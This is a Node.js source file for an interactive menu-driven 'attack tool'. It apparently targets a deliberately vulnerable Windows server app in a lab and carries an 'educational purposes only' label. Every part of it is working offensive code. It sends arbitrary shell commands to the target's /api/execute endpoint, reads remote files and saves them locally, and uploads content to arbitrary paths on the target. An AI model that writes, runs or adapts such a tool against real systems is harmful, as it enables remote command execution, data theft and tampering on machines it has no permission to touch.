import * as readline from "readline";
import fetch from "node-fetch";
import * as fs from "fs";
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});
let targetServer = "";
function showMainMenu() {
    console.clear();
    console.log("=".repeat(60));
    console.log("VULNERABLE WINDOWS APP - ATTACK TOOL");
    console.log("For educational purposes only");
    console.log("=".repeat(60));
    console.log(`Target: ${targetServer || "Not set"}`);
    console.log("=".repeat(60));
    console.log("1. Set target server");
    console.log("2. Test connection");
    console.log("3. Execute command");
    console.log("4. Read file");
    console.log("5. Write file");
    console.log("6. Exit");
    console.log("=".repeat(60));
    rl.question("Select an option: ", (answer) => {
        switch (answer) {
            case "1":
                setTargetServer();
                break;
            case "2":
                testConnection();
                break;
            case "3":
                executeCommand();
                break;
            case "4":
                readFile();
                break;
            case "5":
                writeFile();
                break;
            case "6":
                console.log("Exiting...");
                rl.close();
                break;
            default:
                console.log("Invalid option");
                setTimeout(showMainMenu, 1000);
        }
    });
}
function setTargetServer() {
    rl.question("Enter target server address (e.g., http://192.168.1.100:3000): ", (answer) => {
        targetServer = answer.trim();
        console.log(`Target set to: ${targetServer}`);
        setTimeout(showMainMenu, 1500);
    });
}
async function testConnection() {
    if (!targetServer) {
        console.log("Please set a target server first");
        setTimeout(showMainMenu, 1500);
        return;
    }
    console.log("Testing connection...");
    try {
        const response = await fetch(`${targetServer}/api/status`);
        const data = await response.json();
        console.log("Connection successful!");
        console.log("Server info:");
        console.log(JSON.stringify(data, null, 2));
    }
    catch (error) {
        console.log("Connection failed:");
        if (error instanceof Error) {
            console.log(error.message);
        }
        else {
            console.log(String(error));
        }
    }
    rl.question("Press Enter to continue...", () => {
        showMainMenu();
    });
}
async function executeCommand() {
    if (!targetServer) {
        console.log("Please set a target server first");
        setTimeout(showMainMenu, 1500);
        return;
    }
    rl.question("Enter command to execute: ", async (command) => {
        console.log(`Executing: ${command}`);
        try {
            const encodedCommand = encodeURIComponent(command);
            const response = await fetch(`${targetServer}/api/execute?command=${encodedCommand}`);
            const data = await response.json();
            console.log("Result:");
            if (data && typeof data === "object") {
                if (data.error) {
                    console.log("Error:", data.error);
                }
                if (data.stdout) {
                    console.log("Output:", data.stdout);
                }
                if (data.stderr) {
                    console.log("Error output:", data.stderr);
                }
            }
            else {
                console.log("Unexpected response format:", data);
            }
        }
        catch (error) {
            console.log("Request failed:");
            if (error instanceof Error) {
                console.log(error.message);
            }
            else {
                console.log(String(error));
            }
        }
        rl.question("Press Enter to continue...", () => {
            showMainMenu();
        });
    });
}
async function readFile() {
    if (!targetServer) {
        console.log("Please set a target server first");
        setTimeout(showMainMenu, 1500);
        return;
    }
    rl.question("Enter file path to read: ", async (filePath) => {
        console.log(`Reading file: ${filePath}`);
        try {
            const encodedPath = encodeURIComponent(filePath);
            const response = await fetch(`${targetServer}/api/read-file?path=${encodedPath}`);
            const data = await response.json();
            if (data && typeof data === "object" && "error" in data) {
                console.log("Error:", data.error);
            }
            else {
                console.log("File content:");
                console.log("-".repeat(60));
                console.log(data.data);
                console.log("-".repeat(60));
                rl.question("Save to local file? (y/n): ", (answer) => {
                    if (answer.toLowerCase() === "y") {
                        rl.question("Enter local file path: ", (localPath) => {
                            fs.writeFileSync(localPath, data.data);
                            console.log(`File saved to ${localPath}`);
                            rl.question("Press Enter to continue...", () => {
                                showMainMenu();
                            });
                        });
                    }
                    else {
                        rl.question("Press Enter to continue...", () => {
                            showMainMenu();
                        });
                    }
                });
                return;
            }
        }
        catch (error) {
            console.log("Request failed:");
            if (error instanceof Error) {
                console.log(error.message);
            }
            else {
                console.log(String(error));
            }
        }
        rl.question("Press Enter to continue...", () => {
            showMainMenu();
        });
    });
}
async function writeFile() {
    if (!targetServer) {
        console.log("Please set a target server first");
        setTimeout(showMainMenu, 1500);
        return;
    }
    rl.question("Enter file path on target: ", (filePath) => {
        rl.question("Enter content source (1. Text input, 2. Local file): ", (source) => {
            if (source === "1") {
                rl.question("Enter content to write: ", async (content) => {
                    await sendWriteRequest(filePath, content);
                });
            }
            else if (source === "2") {
                rl.question("Enter local file path: ", async (localPath) => {
                    try {
                        const content = fs.readFileSync(localPath, "utf8");
                        await sendWriteRequest(filePath, content);
                    }
                    catch (error) {
                        console.log("Error reading local file:");
                        if (error instanceof Error) {
                            console.log(error.message);
                        }
                        else {
                            console.log(String(error));
                        }
                        rl.question("Press Enter to continue...", () => {
                            showMainMenu();
                        });
                    }
                });
            }
            else {
                console.log("Invalid option");
                setTimeout(writeFile, 500);
            }
        });
    });
}
async function sendWriteRequest(filePath, content) {
    console.log(`Writing to file: ${filePath}`);
    try {
        const response = await fetch(`${targetServer}/api/write-file`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                path: filePath,
                content: content,
            }),
        });
        const data = await response.json();
        if (data && typeof data === "object" && "error" in data) {
            console.log("Error:", data.error);
        }
        else {
            console.log("File written successfully");
        }
    }
    catch (error) {
        console.log("Request failed:");
        if (error instanceof Error) {
            console.log(error.message);
        }
        else {
            console.log(String(error));
        }
    }
    rl.question("Press Enter to continue...", () => {
        showMainMenu();
    });
}
console.log("Starting attack tool...");
setTimeout(showMainMenu, 500);
//# sourceMappingURL=attack.js.map